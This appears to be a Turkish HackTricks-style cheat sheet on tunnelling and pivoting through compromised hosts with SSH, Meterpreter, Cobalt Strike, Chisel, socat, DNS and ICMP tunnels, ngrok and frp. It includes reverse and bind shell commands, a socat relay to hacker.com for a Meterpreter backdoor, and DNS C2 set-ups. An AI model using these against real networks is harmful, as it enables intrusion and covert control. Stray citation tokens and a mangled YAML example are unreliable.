# Tünelleme ve Port Yönlendirme

{{#include ../banners/hacktricks-training.md}}

## Nmap ipucu

> [!WARNING]
> **ICMP** ve **SYN** taramaları socks proxy'leri üzerinden tünellenemez, bu nedenle **ping keşfini devre dışı bırakmalıyız** (`-Pn`) ve bunun çalışması için **TCP taramalarını** (`-sT`) belirtmeliyiz.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH grafik bağlantısı (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

SSH Sunucusunda Yeni Port Aç --> Diğer port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Yerel port --> Ele geçirilmiş ana bilgisayar (SSH) --> Üçüncü_kutu:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Yerel Port --> Ele geçirilmiş host (SSH) --> Herhangi bir yere
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Ters Port Yönlendirme

Bu, iç hostlardan DMZ üzerinden kendi hostunuza ters shell almak için faydalıdır:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tüneli

Her iki cihazda da **root erişimine ihtiyacınız var** (çünkü yeni arayüzler oluşturacaksınız) ve sshd yapılandırması root girişine izin vermelidir:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Sunucu tarafında yönlendirmeyi etkinleştir.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
İstemci tarafında yeni bir rota ayarlayın
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Güvenlik – Terrapin Saldırısı (CVE-2023-48795)**
> 2023 Terrapin geri alma saldırısı, bir adam-arada saldırganın erken SSH el sıkışmasını değiştirmesine ve **herhangi bir yönlendirilmiş kanala** veri enjekte etmesine olanak tanıyabilir ( `-L`, `-R`, `-D` ). Hem istemcinin hem de sunucunun yamanmış olduğundan emin olun (**OpenSSH ≥ 9.6/LibreSSH 6.7**) veya SSH tünellerine güvenmeden önce savunmasız `chacha20-poly1305@openssh.com` ve `*-etm@openssh.com` algoritmalarını `sshd_config`/`ssh_config` içinde açıkça devre dışı bırakın. citeturn4search0

## SSHUTTLE

Bir ana bilgisayar üzerinden **ssh** ile **alt ağ**'a giden tüm **trafik** için **tünel** oluşturabilirsiniz.\
Örneğin, 10.10.10.0/24'e giden tüm trafiği yönlendirmek
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Özel anahtar ile bağlanın
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Yerel port --> Ele geçirilmiş host (aktif oturum) --> Üçüncü_kutu:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Başka bir yol:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Tüm arayüzlerde dinleyen bir port açın, bu port **beacon üzerinden trafiği yönlendirmek için** kullanılabilir.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Bu durumda, **port beacon host'ta açılır**, Team Server'da değil ve trafik Team Server'a gönderilir ve oradan belirtilen host:port'a iletilir.
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Not edilmesi gerekenler:

- Beacon'ın ters port yönlendirmesi, **bireysel makineler arasında iletim için değil, Team Server'a trafik tünellemek için tasarlanmıştır**.
- Trafik, **Beacon'ın C2 trafiği içinde tünellenir**, P2P bağlantıları dahil.
- Yüksek portlarda ters port yönlendirmeleri oluşturmak için **yönetici ayrıcalıkları gerekmez**.

### rPort2Port yerel

> [!WARNING]
> Bu durumda, **port beacon ana bilgisayarında açılır**, Team Server'da değil ve **trafik Cobalt Strike istemcisine gönderilir** (Team Server'a değil) ve oradan belirtilen host:port'a iletilir.
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Bir web dosyası tüneli yüklemeniz gerekiyor: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) adresinin sürümler sayfasından indirebilirsiniz.\
**İstemci ve sunucu için aynı sürümü kullanmalısınız.**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port yönlendirme
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Ajan ve proxy için aynı sürümü kullanın**

### Tünelleme
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Ajan Bağlama ve Dinleme
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Erişim Ajanının Yerel Portları
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Ters tünel. Tünel, kurban tarafından başlatılır.\
127.0.0.1:1080 adresinde bir socks4 proxy oluşturulur.
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM proxy** üzerinden geçiş yapın
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bağlı shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Ters kabuk
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port üzerinden socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter üzerinden SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Bir **kimlik doğrulaması yapılmamış proxy**'yi, kurbanın konsolundaki son satırın yerine bu satırı çalıştırarak atlayabilirsiniz:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tüneli

**/bin/sh konsolu**

Her iki tarafta da: İstemci ve Sunucu için sertifikalar oluşturun
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Yerel SSH portunu (22) saldırgan ana bilgisayarın 443 portuna bağlayın
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Konsol PuTTY versiyonuna benzer (seçenekler bir ssh istemcisine çok benzer).

Bu ikili dosya kurban üzerinde çalıştırılacağından ve bir ssh istemcisi olduğundan, ters bağlantı kurabilmemiz için ssh hizmetimizi ve portumuzu açmamız gerekiyor. Ardından, yalnızca yerel olarak erişilebilir bir portu makinemizdeki bir porta yönlendirmek için:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Herhangi bir port için yerel yönetici olmanız gerekir.
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

**Sisteme RDP erişiminiz olmalıdır.**\
İndirin:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Bu araç, Windows'un Uzak Masaüstü Servisi özelliğinden `Dynamic Virtual Channels` (`DVC`) kullanır. DVC, **RDP bağlantısı üzerinden paketleri tünellemekten** sorumludur.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

İstemci bilgisayarınızda **`SocksOverRDP-Plugin.dll`** dosyasını şu şekilde yükleyin:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Artık **`mstsc.exe`** kullanarak **RDP** üzerinden **kurban** ile **bağlanabiliriz** ve **SocksOverRDP eklentisinin etkin olduğu** belirten bir **istem** alacağız, bu **127.0.0.1:1080** adresinde **dinleyecektir**.

**RDP** üzerinden **bağlanın** ve kurban makinesine `SocksOverRDP-Server.exe` ikili dosyasını yükleyip çalıştırın:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Şimdi makinenizde (saldırgan) 1080 numaralı portun dinlediğini doğrulayın:
```
netstat -antb | findstr 1080
```
Artık [**Proxifier**](https://www.proxifier.com/) **trafikleri o port üzerinden proxy'lemek için kullanabilirsiniz.**

## Windows GUI Uygulamalarını Proxify Etme

Windows GUI uygulamalarının bir proxy üzerinden gezinmesini sağlamak için [**Proxifier**](https://www.proxifier.com/) kullanabilirsiniz.\
**Profile -> Proxy Servers** kısmına SOCKS sunucusunun IP'sini ve portunu ekleyin.\
**Profile -> Proxification Rules** kısmına proxify etmek istediğiniz programın adını ve proxify etmek istediğiniz IP'lere olan bağlantıları ekleyin.

## NTLM proxy atlatma

Daha önce bahsedilen araç: **Rpivot**\
**OpenVPN** de bunu atlatabilir, yapılandırma dosyasında bu seçenekleri ayarlayarak:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Bir proxy'ye karşı kimlik doğrulaması yapar ve belirttiğiniz dış hizmete yönlendirilmiş yerel bir port bağlar. Ardından, bu port üzerinden tercih ettiğiniz aracı kullanabilirsiniz.\
Örneğin, 443 portunu yönlendirin.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Şimdi, örneğin kurbanın **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Saldırgan 2222 numaralı port üzerinden buna bağlanabilirsiniz.\
Ayrıca, localhost:443'e bağlanan bir **meterpreter** kullanabilir ve saldırgan 2222 numaralı portta dinliyor olabilir.

## YARP

Microsoft tarafından oluşturulmuş bir ters proxy. Bunu burada bulabilirsiniz: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tünelleme

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Her iki sistemde de tun adaptörleri oluşturmak ve DNS sorguları kullanarak aralarında veri tünellemek için root gereklidir.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Tünel çok yavaş olacaktır. Bu tünel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturmak için şunu kullanabilirsiniz:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Buradan indirin**](https://github.com/iagox86/dnscat2)**.**

DNS üzerinden bir C\&C kanalı kurar. Root ayrıcalıklarına ihtiyaç duymaz.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell'da**

PowerShell'da bir dnscat2 istemcisi çalıştırmak için [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kullanabilirsiniz:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat ile port yönlendirme**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Proxychains DNS'ini Değiştir

Proxychains, `gethostbyname` libc çağrısını keser ve tcp DNS isteğini socks proxy üzerinden tüneller. **Varsayılan** olarak proxychains'in kullandığı **DNS** sunucusu **4.2.2.2**'dir (hardcoded). Bunu değiştirmek için dosyayı düzenleyin: _/usr/lib/proxychains3/proxyresolv_ ve IP'yi değiştirin. **Windows ortamında** iseniz, **domain controller**'ın IP'sini ayarlayabilirsiniz.

## Go'da Tüneller

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP Tünelleme

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Her iki sistemde de tun adaptörleri oluşturmak ve ICMP echo istekleri kullanarak veri tünellemek için root gereklidir.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Buradan indirin**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **bir komut satırı ile çözümleri internete açmak için bir araçtır.**\
_Exposition URI şöyle görünür:_ **UID.ngrok.io**

### Kurulum

- Bir hesap oluşturun: https://ngrok.com/signup
- İstemci indirme:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Temel Kullanımlar

**Dokümantasyon:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Gerekirse kimlik doğrulama ve TLS eklemek de mümkündür._

#### TCP Tünelleme
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP ile dosyaları açığa çıkarma
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP çağrılarını dinleme

_XSS, SSRF, SSTI ... için faydalıdır._\
stdout'dan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.0.0.1:4000) doğrudan.

#### Dahili HTTP hizmetini tünelleme
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml basit yapılandırma örneği

3 tünel açar:

- 2 TCP
- 1 HTTP, /tmp/httpbin/ dizininden statik dosyaların sergilenmesiyle
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tüneli)

Cloudflare’ın `cloudflared` daemon'u, **yerel TCP/UDP hizmetlerini** dışa açan tüneller oluşturabilir ve bu, Cloudflare’ın kenarını buluşma noktası olarak kullanarak, gelen güvenlik duvarı kurallarına ihtiyaç duymadan yapılır. Bu, çıkış güvenlik duvarının yalnızca HTTPS trafiğine izin verdiği ancak gelen bağlantıların engellendiği durumlarda oldukça kullanışlıdır.

### Hızlı tünel tek satır komutu
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### DNS ile Kalıcı Tüneller
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Bağlayıcıyı başlatın:
```bash
cloudflared tunnel run mytunnel
```
Çünkü tüm trafik **443 üzerinden dışa çıkıyor**, Cloudflared tünelleri, giriş ACL'lerini veya NAT sınırlarını aşmanın basit bir yoludur. İlgili binary'nin genellikle yükseltilmiş ayrıcalıklarla çalıştığını unutmayın – mümkünse konteynerler veya `--user` bayrağını kullanın. citeturn1search0

## FRP (Hızlı Ters Proxy)

[`frp`](https://github.com/fatedier/frp) **TCP, UDP, HTTP/S, SOCKS ve P2P NAT-delik-delme** destekleyen aktif olarak bakım yapılan bir Go ters proxy'dir. **v0.53.0 (Mayıs 2024)** ile birlikte, bir **SSH Tünel Geçidi** olarak işlev görebilir, böylece bir hedef ana bilgisayar yalnızca stok OpenSSH istemcisini kullanarak ters bir tünel açabilir – ek bir binary gerekmiyor.

### Klasik ters TCP tüneli
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Yeni SSH geçidini kullanma (frpc ikili dosyası yok)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Yukarıdaki komut, kurbanın portunu **8080** **attacker_ip:9000** olarak yayınlar ve ek bir araç dağıtmadan – living-off-the-land pivoting için idealdir. citeturn2search1

## Kontrol edilecek diğer araçlar

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

{{#include ../banners/hacktricks-training.md}}
